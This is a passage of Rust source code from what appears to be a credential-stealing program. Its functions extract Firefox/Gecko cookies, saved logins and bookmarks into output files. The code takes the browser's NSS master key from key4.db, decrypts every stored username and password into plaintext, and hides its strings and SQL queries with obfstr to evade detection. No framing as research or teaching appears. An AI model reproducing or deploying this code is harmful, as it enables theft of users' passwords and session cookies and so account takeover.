                row.get::<_, String>(1)?,
                row.get::<_, String>(2)?,
                row.get::<_, String>(3)?,
                row.get::<_, i64>(4)?,
                row.get::<_, i32>(5)?,
                row.get::<_, i32>(6)?,
            ))
        });

        if let Ok(iter) = rows {
            for result in iter.flatten() {
                total += 1;
                let (host, name, value, path, expiry, is_secure, is_httponly) = result;

                let expires = if expiry > 0 {
                    (expiry + 11644473600) * 1_000_000
                } else {
                    0
                };

                cookies.push(Cookie {
                    host,
                    name,
                    path,
                    is_secure: is_secure != 0,
                    is_httponly: is_httponly != 0,
                    expires,
                    value,
                });
            }
        }

        if !cookies.is_empty() {
            if let Some(parent) = out_file.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            if let Ok(json) = serde_json::to_string_pretty(&cookies) {
                let _ = std::fs::write(out_file, json);
            }
            self.reporter.r_cookies(cookies.len(), total);
        }

        cookies.len()
    }

    #[cfg(feature = "extract_passwords")]
    fn e_gecko_passwords(&mut self, logins_path: &Path, key4_path: &Path, out_file: &Path) -> usize {
        let key4_conn = if let Some(conn) = self.o_database_with_copy(key4_path) {
            conn
        } else {
            return 0;
        };

        let nss_key = match kurion_crypto::nss::e_master_key(&key4_conn) {
            Ok(k) => k,
            Err(_) => return 0,
        };

        let logins_data = match std::fs::read_to_string(logins_path) {
            Ok(d) => d,
            Err(_) => return 0,
        };

        let logins_json: serde_json::Value = match serde_json::from_str(&logins_data) {
            Ok(v) => v,
            Err(_) => return 0,
        };

        let logins = match logins_json.get("logins").and_then(|l| l.as_array()) {
            Some(arr) => arr,
            None => return 0,
        };

        let mut passwords = Vec::new();

        for login in logins {
            let hostname = login.get(obfstr::obfstr!("hostname"))
                .or_else(|| login.get(obfstr::obfstr!("origin")))
                .and_then(|v| v.as_str())
                .unwrap_or("");

            let enc_username = match login.get(obfstr::obfstr!("encryptedUsername")).and_then(|v| v.as_str()) {
                Some(s) => s,
                None => continue,
            };

            let enc_password = match login.get(obfstr::obfstr!("encryptedPassword")).and_then(|v| v.as_str()) {
                Some(s) => s,
                None => continue,
            };

            let user = kurion_crypto::nss::d_field(&nss_key, enc_username)
                .unwrap_or_default();
            let pass = kurion_crypto::nss::d_field(&nss_key, enc_password)
                .unwrap_or_default();

            if !user.is_empty() || !pass.is_empty() {
                passwords.push(Password {
                    url: hostname.to_string(),
                    user,
                    pass,
                });
            }
        }

        if !passwords.is_empty() {
            if let Some(parent) = out_file.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            let mut text = String::new();
            for p in &passwords {
                text.push_str(&format!("URL: {}\nUser: {}\nPassword: {}\n-------------------------------\n",
                    p.url, p.user, p.pass));
            }
            let _ = std::fs::write(out_file, &text);
            self.reporter.r_passwords(passwords.len());
        }

        passwords.len()
    }

    #[cfg(feature = "extract_passwords")]
    fn e_gecko_passwords_from_db(&mut self, logins_conn: &Connection, key4_path: &Path, out_file: &Path) -> usize {
        let key4_conn = if let Some(conn) = self.o_database_with_copy(key4_path) {
            conn
        } else {
            return 0;
        };

        let nss_key = match kurion_crypto::nss::e_master_key(&key4_conn) {
            Ok(k) => k,
            Err(_) => return 0,
        };

        let query = obfstr::obfstr!("SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins").to_string();
        let mut stmt = match logins_conn.prepare(&query) {
            Ok(s) => s,
            Err(_) => return 0,
        };

        let mut passwords = Vec::new();

        let rows = stmt.query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, Vec<u8>>(1)?,
                row.get::<_, Vec<u8>>(2)?,
            ))
        });

        if let Ok(iter) = rows {
            for result in iter.flatten() {
                let (hostname, enc_username_blob, enc_password_blob) = result;

                let user = kurion_crypto::nss::d_blob(&nss_key, &enc_username_blob)
                    .unwrap_or_default();
                let pass = kurion_crypto::nss::d_blob(&nss_key, &enc_password_blob)
                    .unwrap_or_default();

                if !user.is_empty() || !pass.is_empty() {
                    passwords.push(Password {
                        url: hostname,
                        user,
                        pass,
                    });
                }
            }
        }

        if !passwords.is_empty() {
            if let Some(parent) = out_file.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            let mut text = String::new();
            for p in &passwords {
                text.push_str(&format!("URL: {}\nUser: {}\nPassword: {}\n-------------------------------\n",
                    p.url, p.user, p.pass));
            }
            let _ = std::fs::write(out_file, &text);
            self.reporter.r_passwords(passwords.len());
        }

        passwords.len()
    }

    #[cfg(feature = "extract_bookmarks")]
    fn e_gecko_bookmarks(&mut self, conn: &Connection, out_file: &Path) -> usize {
        let query = obfstr::obfstr!("SELECT b.title, p.url, COALESCE((SELECT group_concat(parent.title, '/') FROM moz_bookmarks parent WHERE parent.id IN (SELECT id FROM moz_bookmarks WHERE id IN (b.parent, (SELECT parent FROM moz_bookmarks WHERE id = b.parent)))), 'Root') as folder_path FROM moz_bookmarks b JOIN moz_places p ON b.fk = p.id WHERE b.type = 1 AND p.url IS NOT NULL ORDER BY folder_path, b.title").to_string();

        let mut stmt = match conn.prepare(&query) {
            Ok(s) => s,
            Err(_) => {
                let simple_query = obfstr::obfstr!("SELECT b.title, p.url FROM moz_bookmarks b JOIN moz_places p ON b.fk = p.id WHERE b.type = 1 AND p.url IS NOT NULL").to_string();
                match conn.prepare(&simple_query) {
                    Ok(s) => s,
                    Err(_) => return 0,
                }
            }
        };

        let mut bookmarks = Vec::new();

        let rows = stmt.query_map([], |row| {
            let title = row.get::<_, String>(0).unwrap_or_default();
            let url = row.get::<_, String>(1).unwrap_or_default();
            let folder = row.get::<_, String>(2).unwrap_or_else(|_| "Bookmarks".to_string());
            Ok((title, url, folder))
        });

        if let Ok(iter) = rows {
            for result in iter.flatten() {
                let (name, url, folder) = result;
                if !url.is_empty() {
                    bookmarks.push(Bookmark { name, url, folder });
                }
            }
        }

        if !bookmarks.is_empty() {
            if let Some(parent) = out_file.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            if let Ok(json) = serde_json::to_string_pretty(&bookmarks) {
                let _ = std::fs::write(out_file, json);
            }
            self.reporter.r_bookmarks(bookmarks.len());
        }

        bookmarks.len()
    }
}
